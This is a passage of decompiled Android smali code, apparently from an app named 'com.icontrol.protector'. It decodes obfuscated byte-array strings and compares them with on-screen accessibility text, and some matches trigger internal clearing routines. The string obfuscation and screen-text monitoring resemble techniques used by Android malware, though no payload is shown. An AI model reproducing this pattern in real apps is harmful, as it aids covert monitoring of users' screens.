    invoke-interface {v7, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v7

    invoke-virtual {v5, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_9

    new-array v5, v6, [B

    fill-array-data v5, :array_3a

    new-array v6, v15, [B

    fill-array-data v6, :array_3b

    invoke-static {v5, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v6

    invoke-interface {v6, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_9

    const/16 v5, 0xf

    new-array v6, v5, [B

    fill-array-data v6, :array_3c

    new-array v7, v15, [B

    fill-array-data v7, :array_3d

    invoke-static {v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v7

    invoke-interface {v7, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-nez v6, :cond_9

    new-array v6, v10, [B

    fill-array-data v6, :array_3e

    new-array v7, v15, [B

    fill-array-data v7, :array_3f

    invoke-static {v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v7

    invoke-interface {v7, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-nez v6, :cond_9

    new-array v6, v9, [B

    fill-array-data v6, :array_40

    new-array v7, v15, [B

    fill-array-data v7, :array_41

    invoke-static {v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v7

    invoke-interface {v7, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-nez v6, :cond_9

    const/16 v6, 0x4b

    new-array v6, v6, [B

    fill-array-data v6, :array_42

    new-array v7, v15, [B

    fill-array-data v7, :array_43

    invoke-static {v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v7

    invoke-interface {v7, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-nez v6, :cond_9

    const/16 v6, 0x2c

    new-array v6, v6, [B

    fill-array-data v6, :array_44

    new-array v7, v15, [B

    fill-array-data v7, :array_45

    invoke-static {v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v7

    invoke-interface {v7, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-nez v6, :cond_9

    new-array v6, v13, [B

    fill-array-data v6, :array_46

    new-array v7, v15, [B

    fill-array-data v7, :array_47

    invoke-static {v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v7

    invoke-interface {v7, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-nez v6, :cond_9

    new-array v3, v3, [B

    fill-array-data v3, :array_48

    new-array v6, v15, [B

    fill-array-data v6, :array_49

    invoke-static {v3, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v6

    invoke-interface {v6, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v6

    invoke-virtual {v3, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_9

    const/16 v3, 0x10

    new-array v3, v3, [B

    fill-array-data v3, :array_4a

    new-array v6, v15, [B

    fill-array-data v6, :array_4b

    invoke-static {v3, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v6

    invoke-interface {v6, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v6

    invoke-virtual {v3, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_9

    new-array v3, v11, [B

    fill-array-data v3, :array_4c

    new-array v6, v15, [B

    fill-array-data v6, :array_4d

    invoke-static {v3, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v6

    invoke-interface {v6, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v6

    invoke-virtual {v3, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_9

    new-array v3, v0, [B

    fill-array-data v3, :array_4e

    new-array v6, v15, [B

    fill-array-data v6, :array_4f

    invoke-static {v3, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v6

    invoke-interface {v6, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v6

    invoke-virtual {v3, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_9

    const/16 v3, 0x15

    new-array v6, v3, [B

    fill-array-data v6, :array_50

    new-array v3, v15, [B

    fill-array-data v3, :array_51

    invoke-static {v6, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v6

    invoke-interface {v6, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v6

    invoke-virtual {v3, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_9

    new-array v3, v5, [B

    fill-array-data v3, :array_52

    new-array v5, v15, [B

    fill-array-data v5, :array_53

    invoke-static {v3, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v5

    invoke-interface {v5, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v5

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_9

    new-array v3, v11, [B

    fill-array-data v3, :array_54

    new-array v5, v15, [B

    fill-array-data v5, :array_55

    invoke-static {v3, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v5

    invoke-interface {v5, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v5

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_9

    const/16 v3, 0x1c

    new-array v3, v3, [B

    fill-array-data v3, :array_56

    new-array v5, v15, [B

    fill-array-data v5, :array_57

    invoke-static {v3, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v5

    invoke-interface {v5, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v5

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_7

    goto/16 :goto_3

    :cond_7
    const/16 v3, 0x15

    new-array v5, v3, [B

    fill-array-data v5, :array_58

    new-array v3, v15, [B

    fill-array-data v3, :array_59

    invoke-static {v5, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v5

    invoke-interface {v5, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v5

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_8

    const/16 v3, 0xc

    new-array v3, v3, [B

    fill-array-data v3, :array_5a

    new-array v5, v15, [B

    fill-array-data v5, :array_5b

    invoke-static {v3, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v5

    invoke-interface {v5, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v5

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_8

    const/16 v3, 0xc

    new-array v3, v3, [B

    fill-array-data v3, :array_5c

    new-array v5, v15, [B

    fill-array-data v5, :array_5d

    invoke-static {v3, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v5

    invoke-interface {v5, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v5

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_8

    new-array v3, v13, [B

    fill-array-data v3, :array_5e

    new-array v5, v15, [B

    fill-array-data v5, :array_5f

    invoke-static {v3, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v5

    invoke-interface {v5, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v5

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_8

    const/16 v3, 0x15

    new-array v3, v3, [B

    fill-array-data v3, :array_60

    new-array v5, v15, [B

    fill-array-data v5, :array_61

    invoke-static {v3, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v5

    invoke-interface {v5, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v5

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_8

    new-array v3, v4, [B

    fill-array-data v3, :array_62

    new-array v4, v15, [B

    fill-array-data v4, :array_63

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v4

    invoke-interface {v4, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_8

    const/16 v3, 0x27

    new-array v3, v3, [B

    fill-array-data v3, :array_64

    new-array v4, v15, [B

    fill-array-data v4, :array_65

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v4

    invoke-interface {v4, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_8

    const/16 v3, 0x33

    new-array v3, v3, [B

    fill-array-data v3, :array_66

    new-array v4, v15, [B

    fill-array-data v4, :array_67

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v4

    invoke-interface {v4, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_8

    new-array v3, v10, [B

    fill-array-data v3, :array_68

    new-array v4, v15, [B

    fill-array-data v4, :array_69

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v4

    invoke-interface {v4, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_8

    new-array v3, v11, [B

    fill-array-data v3, :array_6a

    new-array v4, v15, [B

    fill-array-data v4, :array_6b

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v4

    invoke-interface {v4, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_8

    const/16 v3, 0x17

    new-array v3, v3, [B

    fill-array-data v3, :array_6c

    new-array v4, v15, [B

    fill-array-data v4, :array_6d

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v4

    invoke-interface {v4, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_8

    const/16 v3, 0x10

    new-array v3, v3, [B

    fill-array-data v3, :array_6e

    new-array v4, v15, [B

    fill-array-data v4, :array_6f

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v4

    invoke-interface {v4, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_8

    const/16 v3, 0x1a

    new-array v3, v3, [B

    fill-array-data v3, :array_70

    new-array v4, v15, [B

    fill-array-data v4, :array_71

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v4

    invoke-interface {v4, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_8

    const/16 v3, 0x23

    new-array v3, v3, [B

    fill-array-data v3, :array_72

    new-array v4, v15, [B

    fill-array-data v4, :array_73

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v4

    invoke-interface {v4, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_8

    new-array v3, v11, [B

    fill-array-data v3, :array_74

    new-array v4, v15, [B

    fill-array-data v4, :array_75

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v4

    invoke-interface {v4, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_8

    const/16 v3, 0xe

    new-array v3, v3, [B

    fill-array-data v3, :array_76

    new-array v4, v15, [B

    fill-array-data v4, :array_77

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v4

    invoke-interface {v4, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_8

    new-array v0, v0, [B

    fill-array-data v0, :array_78

    new-array v3, v15, [B

    fill-array-data v3, :array_79

    invoke-static {v0, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v3

    invoke-interface {v3, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_8

    new-array v0, v10, [B

    fill-array-data v0, :array_7a

    new-array v3, v15, [B

    fill-array-data v3, :array_7b

    invoke-static {v0, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v3

    invoke-interface {v3, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_8

    const/16 v0, 0xe

    new-array v0, v0, [B

    fill-array-data v0, :array_7c

    new-array v3, v15, [B

    fill-array-data v3, :array_7d

    invoke-static {v0, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v3

    invoke-interface {v3, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_8

    const/16 v0, 0x21

    new-array v0, v0, [B

    fill-array-data v0, :array_7e

    new-array v3, v15, [B

    fill-array-data v3, :array_7f

    invoke-static {v0, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v3

    invoke-interface {v3, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_8

    new-array v0, v2, [B

    fill-array-data v0, :array_80

    new-array v2, v15, [B

    fill-array-data v2, :array_81

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v2

    invoke-interface {v2, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_8

    const/16 v0, 0x26

    new-array v0, v0, [B

    fill-array-data v0, :array_82

    new-array v2, v15, [B

    fill-array-data v2, :array_83

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v2

    invoke-interface {v2, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_8

    const/16 v0, 0x19

    new-array v0, v0, [B

    fill-array-data v0, :array_84

    new-array v2, v15, [B

    fill-array-data v2, :array_85

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v2

    invoke-interface {v2, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_b

    :cond_8
    sget-object v0, Lcom/icontrol/protector/c;->c:Ljava/util/LinkedList;

    invoke-virtual {v0}, Ljava/util/LinkedList;->clear()V

    sget-object v0, Lcom/icontrol/protector/c;->d:Ljava/util/Set;

    invoke-interface {v0}, Ljava/util/Set;->clear()V

    goto :goto_4

    :cond_9
    :goto_3
    new-array v0, v1, [B

    const/16 v2, 0xa

    aput-byte v2, v0, v14

    new-array v2, v15, [B

    fill-array-data v2, :array_86

